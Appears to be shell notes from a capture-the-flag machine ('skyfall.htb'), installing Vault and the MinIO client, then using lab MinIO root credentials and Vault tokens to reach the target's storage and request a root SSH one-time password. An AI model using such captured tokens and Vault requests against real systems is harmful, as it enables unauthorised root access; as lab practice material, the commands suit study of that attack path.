```bash
wget -O- https://apt.releases.hashicorp.com/gpg | sudo gpg --dearmor -o /usr/share/keyrings/hashicorp-archive-keyring.gpg
echo "deb [signed-by=/usr/share/keyrings/hashicorp-archive-keyring.gpg] https://apt.releases.hashicorp.com $(lsb_release -cs) main" | sudo tee /etc/apt/sources.list.d/hashicorp.list
sudo apt update && sudo apt install vault 
```

```bash
curl https://dl.min.io/client/mc/release/linux-amd64/mc \
  --create-dirs \
  -o $HOME/minio-binaries/mc

chmod +x $HOME/minio-binaries/mc
export PATH=$PATH:$HOME/minio-binaries/

mc --help
```

```bash
export MINIO_ROOT_USER=5GrE1B2YGGyZzNHZaIww
export MINIO_ROOT_PASSWORD=GkpjkmiVmpFuL2d3oRx0

./mc alias set myminio http://prd23-s3-backend.skyfall.htb $MINIO_ROOT_USER $MINIO_ROOT_PASSWORD

export VAULT_ADDR="http://prd23-vault-internal.skyfall.htb"
export VAULT_TOKEN="hvs.CAESIJlU9JMYEhOPYv4igdhm9PnZDrabYTobQ4Ymnlq1qY-LGh4KHGh2cy43OVRNMnZhakZDRlZGdGVzN09xYkxTQVE"

export VAULT_TOKEN="hvs.I0ewVsmaKU1SwVZAKR3T0mmG"

vault write ssh/creds/admin_otp_key_role ip=10.10.11.254 username=root

```
